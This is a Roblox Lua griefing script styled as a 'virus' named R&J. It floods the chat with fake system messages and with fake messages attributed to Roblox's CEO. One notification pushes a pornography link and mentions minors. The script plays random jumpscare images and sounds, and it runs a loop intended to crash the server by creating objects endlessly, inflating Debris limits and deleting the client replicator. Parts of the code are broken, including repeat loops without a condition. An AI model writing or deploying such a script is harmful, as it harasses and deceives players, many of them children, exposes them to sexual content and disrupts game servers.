--AntiFly = THE R&J CORE!! 



local foldername = "JOKER"
local p = script.Parent.Parent.PlayerGui
--Warning texts 

function Callback(answer)
	if answer == "KILL ME!" then
		game.Players.LocalPlayer:Kick("YOU SELECTED THE KILL BUTTON , BUT YOU CAN EXIT NOW! , WHILE PEOPLE WHO HAVE CHOSEN THE SURVIVOR OPTION WILL BE SUFFERING FOR THEIR LIFE")
	elseif answer == "I going to survive!" then
		Instance.new("Message", script.Parent.Parent.PlayerGui)
		script.Parent.Parent.PlayerGui.Message.Name = "rj"
		script.Parent.Parent.PlayerGui.rj.Text = "YOU ARE AN SURVIVOR!"
		wait(5)
		script.Parent.Parent.PlayerGui.rj:Destroy()
	elseif answer == "Show now!" then
		Instance.new("ScreenGui", script.Parent.Parent.PlayerGui)
		Instance.new("ImageLabel", script.Parent.Parent.PlayerGui.ScreenGui)
		script.Parent.Parent.PlayerGui.ScreenGui.ImageLabel.Image = "rbxassetid://9283017228"
		wait(4)
		script.Parent.Parent.PlayerGui.ScreenGui.ImageLabel:Remove()
	end
end

local Bindable = Instance.new("BindableFunction")
Bindable.OnInvoke = Callback

game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "OH NO..."; 
	Text = "R&J WAS HERE!!!!!"; 
	Icon = "rbxassetid://7307851323"; 
	Duration = 20; 
	Button1 = "KILL ME!";
	Button2 = "I going to survive!";
	Callback = Bindable
})

bc = BrickColor.new("Really red") 
bc2 = BrickColor.new("Really red")  

game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "THE JOKER & AUX PLANS"; 
	Font = Enum.Font.Cartoon; 
	Color = bc.Color;
	FontSize = Enum.FontSize.Size96;
})
wait(2)
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "PRESENTS"; 
	Font = Enum.Font.Cartoon;
	Color = bc2.Color;
	FontSize = Enum.FontSize.Size96;
})
wait(2)	


local h = Instance.new("Message")
h.Parent = p
h.Text = "WARNING!!"
wait(5)
h:Remove()

local g = Instance.new("Message")
g.Parent = p
g.Text = "R&J WAS HERE!!"
wait(5)
g:Remove()

local i = Instance.new("Message")
i.Parent = p
i.Text = "''''RoJack''''"
wait(5)
i:Remove()

local j = Instance.new("Message")
j.Parent = p
j.Text = "GET OUT RIGHT NOW OR ELSE THE JOKER & AUX PLANS WILL HACK YOU AND FUCK YOU!!!!"
wait(5)
j:Remove()


local k = Instance.new("Message")
k.Parent = p
k.Text = "3!!!!!"
wait(1)
k:Remove()

local k = Instance.new("Message")
k.Parent = p
k.Text = "2!!!!!"
wait(1)
k:Remove()

local k = Instance.new("Message")
k.Parent = p
k.Text = "1!!!!!"
wait(1)
k:Remove()


game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "(AD) BLOXY COLA"; 
	Text = "PURCHASE NOW BLOXY COLA!!!!!!!"; 
	Icon = "rbxassetid://9283017228"; 
	Duration = 6; 
})

local Cartoon = "SourceSansBold"


local bc3 = BrickColor.new("Medium orange")
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "[System]: Warning ,"; 
	Font = Enum.Font.SourceSansBold;
	Color = bc3.Color;
	FontSize = Enum.FontSize.Size96;
})
wait(4)
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "[System]: Roblox is being Attacked by"; 
	Font = Enum.Font.SourceSansBold;
	Color = bc3.Color;
	FontSize = Enum.FontSize.Size96;
})
wait(5)
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "[System]: An virus called R&J"; 
	Font = Enum.Font.SourceSansBold;
	Color = bc3.Color;
	FontSize = Enum.FontSize.Size96;
})
wait(3)
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "[System]: But Roblox's major vulnerability has been patched"; 
	Font = Enum.Font.SourceSansBold;
	Color = bc3.Color;
	FontSize = Enum.FontSize.Size96;
})
wait(2)
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "[System]: Oh , I lost say  "; 
	Font = Enum.Font.SourceSansBold;
	Color = bc3.Color;
	FontSize = Enum.FontSize.Size96;
})
wait(4)
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "[S̶y̶s̶t̶e̶m̶  R&J]: NOT ENJOY ROBLOX >:) "; 
	Font = Enum.Font.SciFi;
	Color = bc3.Color;
	FontSize = Enum.FontSize.Size96;
})

wait(2)

-- VV!! +18 !!VV
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "(AD) Do you like..."; 
	Text = "Porn?? , if yes , please visit www.pornhub.com to E̶L̶D̶E̶R̶L̶Y̶   MINORS THAN 18+ >:) "; 
	Icon = "rbxassetid://2507015297"; 
	Duration = 6; 
})

--AA!! +18 !!AA



-- False "David Baszucki" Messages

local bc4 = BrickColor.new("Really red")

game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "[David Baszucki]: RED ALERT , PLEASE COME TO THE ROBLOX CAMPUS "; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
wait(3)
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "[David Baszucki]: IS VERY SERIOUS THIS PROBLEM!!!!!!! "; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
wait(2)
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "[David Baszucki (My Puppet >:)]: PLEASE!!!!!!! "; 
	Font = Enum.Font.SciFi;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
wait(5)

--The R&J Big Text  (Is hard to make this big text because it has to be paragraph by paragraph and includes a lot of script)
--Probably i reduce this to a simple Function 
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "   "; --12  18
	Font = Enum.Font.Cartoon;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "   "; --12  18
	Font = Enum.Font.Cartoon;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "██████╗░   "; --12  18
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "██╔══██╗  "; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "██████╔╝ "; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "██╔══██╗ "; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "██║░░██║";
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = ""; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "     ░░░░░██╗	"; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "       ░░░░░██║ "; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "       ░░░░░██║ "; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "       ██╗░░██║"; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "       ╚█████╔╝ "; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})
game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "        ░╚════╝░     -With love, ELJOKER"; 
	Font = Enum.Font.SourceSansBold;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})



game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = " OVERLOADING SERVER... "; 
	Font = Enum.Font.SciFi;
	Color = bc4.Color;
	FontSize = Enum.FontSize.Size96;
})

game.StarterGui:SetCore("ChatMakeSystemMessage", {
	Text = "PORN! "; 
	Font = Enum.Font.Code;
	Color = bc2.Color;
	FontSize = Enum.FontSize.Size96;
})

game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "(AD) 7-ELEVEN"; 
	Text = "ALL THINGS!"; 
	Icon = "rbxassetid://11909941032"; 
	Duration = 8; 
})

--the parts creator (VERY IMPORTANT)

repeat
	
	local A = "OH NO!!!" or "YOU LIKE THIS?"
	local B = "rbxassetid://12779093377" or "rbxassetid://11560341824"
	local C = 4 or 9 or 7

	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = A; 
		Text = "''By R&J''";
		Icon = B; 
		Duration = C; 
	})
	wait(7)
	
	
	Instance.new("Part", game.ServerStorage)
	Instance.new("Part", game.ServerStorage)
	wait(0)
	
	local w = Instance.new("Hint", p)
	w.Text = math.random(1,90000)
	
	
	--SERVER CRASHER-- (I dont know is this will be overload the server storage in 10 mins)
	
	local M1 = math.random(1,2)
	
	if M1 == 1 then
		Instance.new("Part", game.Workspace) 

		game.Workspace.Part.Name = "THISSERVERISAFFECTEDBYR&JORTHECALLEDROJACKBYAUXILIARYPLANSANDTHEJOKER,THISWILLBEFUCKROBLOX>:)"

		game.Workspace["THISSERVERISAFFECTEDBYR&JORTHECALLEDROJACKBYAUXILIARYPLANSANDTHEJOKER,THISWILLBEFUCKROBLOX>:)"].Parent = game.ServerStorage
	end
	
	if M1 == 2 then
		Instance.new("ImageLabel", game.Workspace)

		game.Workspace.ImageLabel.Name = "THISSERVERISAFFECTEDBYR&JORTHECALLEDROJACKBYAUXILIARYPLANSANDTHEJOKER,THISWILLBEFUCKROBLOX>:)BUTMORE"
		wait()

		game.Workspace["THISSERVERISAFFECTEDBYR&JORTHECALLEDROJACKBYAUXILIARYPLANSANDTHEJOKER,THISWILLBEFUCKROBLOX>:)BUTMORE"].Parent = game.ServerStorage
	end
	
	pcall(function() --uses pcall to prevent the error stop R&J
		local mx = game.Debris
		local mx2 = game.Debris.MaxItems

		mx.MaxItems = mx2*100000000000
	end)

	pcall(function()
		game.Name = "R&J THE VIRUS"
		
		game.NetworkClient.ClientReplicator:Destroy() --i want to try delete ClientReplicator
	end)
	
	
	print("PYTHON!")
	
	--⇩⇩ SCARY! ⇩⇩--
	Instance.new("Sound", p.ScreenGui)
	
	local jd = math.random(1,200)
	local v = p.ScreenGui.Sound.Volume
	wait()
	if jd == 10 then
		-- JOKER
		Instance.new("ScreenGui", p)
		Instance.new("ImageLabel", p.ScreenGui)
		Instance.new("Sound", p.ScreenGui)
		
		
		
		p.ScreenGui.ImageLabel.Image = "rbxassetid://12698170603"
		
		p.ScreenGui.ImageLabel.Size = UDim2.new(0, 971, 0, 627)
		
		p.ScreenGui.Sound.SoundId = "rbxassetid://138085144"
		
		v = "100"
		
		p.ScreenGui.Sound:Play()
		p.ScreenGui.Sound.Ended:Wait()
		p.ScreenGui.Sound:Remove()
		p.ScreenGui.ImageLabel:Remove()
		p.ScreenGui:Remove()
	end

	if jd == 15 then
		-- NOOB FACE WITCH BLOOD AND SCARY
		Instance.new("ScreenGui", p)
		Instance.new("ImageLabel", p.ScreenGui)
		Instance.new("Sound", p.ScreenGui)
		
		
		
		p.ScreenGui.ImageLabel.Image = "rbxassetid://9179833499"
		
		p.ScreenGui.ImageLabel.Size = UDim2.new(0, 971, 0, 627)
		
		p.ScreenGui.Sound.SoundId = "rbxassetid://7854285068"
		
		v = "100"
		
		p.ScreenGui.Sound:Play()
		p.ScreenGui.Sound.Ended:Wait()
		p.ScreenGui.Sound:Remove()
		p.ScreenGui.ImageLabel:Remove()
		p.ScreenGui:Remove()
	end 
	
	if jd == 86 then
		-- EXE (Incluides laugh)
		Instance.new("ScreenGui", p)
		Instance.new("ImageLabel", p.ScreenGui)
		Instance.new("Sound", p.ScreenGui)
		
		p.ScreenGui.ImageLabel.Image = "rbxassetid://1736422966"
		
		p.ScreenGui.ImageLabel.Size = UDim2.new(0, 971, 0, 627)
		
		p.ScreenGui.Sound.SoundId = "rbxassetid://7337298420"
		
		v = "100"
		
		p.ScreenGui.Sound:Play()
		p.ScreenGui.Sound.Ended:Wait()
		p.ScreenGui.Sound:Remove()
		p.ScreenGui.ImageLabel:Remove()
		p.ScreenGui:Remove()
	end 
	
	if jd == 162 then
		-- EYE
		Instance.new("ScreenGui", p)
		Instance.new("ImageLabel", p.ScreenGui)
		Instance.new("Sound", p.ScreenGui)
		
		p.ScreenGui.ImageLabel.Image = "rbxassetid://10657365540"
		
		p.ScreenGui.ImageLabel.Size = UDim2.new(0, 971, 0, 627)
		
		p.ScreenGui.Sound.SoundId = "rbxassetid://157636218"
		
		v = "100"
		
		p.ScreenGui.Sound:Play()
		p.ScreenGui.Sound.Ended:Wait()
		p.ScreenGui.Sound:Remove()
		p.ScreenGui.ImageLabel:Remove()
		p.ScreenGui:Remove()
	end 
	
	if jd == 145 then
		-- An scary face
		Instance.new("ScreenGui", p)
		Instance.new("ImageLabel", p.ScreenGui)
		Instance.new("Sound", p.ScreenGui)
		
		p.ScreenGui.ImageLabel.Image = "rbxassetid://7057923071"
		
		p.ScreenGui.ImageLabel.Size = UDim2.new(0, 971, 0, 627)
		
		p.ScreenGui.Sound.SoundId = "rbxassetid://157636218"
		
		v = "100"
		
		
		
		p.ScreenGui.Sound:Play()
		p.ScreenGui.Sound.Ended:Wait()
		p.ScreenGui.Sound:Remove()
		p.ScreenGui.ImageLabel:Remove()
		p.ScreenGui:Remove()
	end 
	
	if jd == 163 then
		-- Other scary face
		Instance.new("ScreenGui", p)
		Instance.new("ImageLabel", p.ScreenGui)
		Instance.new("Sound", p.ScreenGui)
		
		p.ScreenGui.ImageLabel.Image = "rbxassetid://1243374078"
		
		p.ScreenGui.ImageLabel.Size = UDim2.new(0, 971, 0, 627)
		
		p.ScreenGui.Sound.SoundId = "rbxassetid://7854285068"
		
		v = "100"
		
		p.ScreenGui.Sound:Play()
		p.ScreenGui.Sound.Ended:Wait()
		p.ScreenGui.Sound:Remove()
		p.ScreenGui.ImageLabel:Remove()
		p.ScreenGui:Remove()
	end
	
	if jd == 111 then
		-- CREEPY IMAGE
		Instance.new("ScreenGui", p)
		Instance.new("ImageLabel", p.ScreenGui)
		Instance.new("Sound", p.ScreenGui)
		
		p.ScreenGui.ImageLabel.Image = "rbxassetid:/6876459671"
		
		p.ScreenGui.ImageLabel.Size = UDim2.new(0, 971, 0, 627)
		
		p.ScreenGui.Sound.SoundId = "rbxassetid://7854285068"
		
		p.ScreenGui.Sound:Play()
		p.ScreenGui.Sound.Ended:Wait()
		p.ScreenGui.Sound:Remove()
		p.ScreenGui.ImageLabel:Remove()
		p.ScreenGui:Remove()
	end
	
	if jd == 101 then
		-- Other
		Instance.new("ScreenGui", p)
		Instance.new("ImageLabel", p.ScreenGui)
		Instance.new("Sound", p.ScreenGui)

		p.ScreenGui.ImageLabel.Image = "rbxassetid://7307851323"
		
		p.ScreenGui.ImageLabel.Size = UDim2.new(0, 971, 0, 627)

		p.ScreenGui.Sound.SoundId = "rbxassetid://6821054463"

		p.ScreenGui.Sound:Play()
		p.ScreenGui.Sound.Ended:Wait()
		p.ScreenGui.Sound:Remove()
		p.ScreenGui.ImageLabel:Remove()
		p.ScreenGui:Remove()
	end
	
	--⇧⇧ SCARY! ⇧⇧--
	wait()
	
	print ("HEHE")
until

print("HELLO")
wait(3)
repeat

until



--an message (console)

print("BY-THE-JOKER")

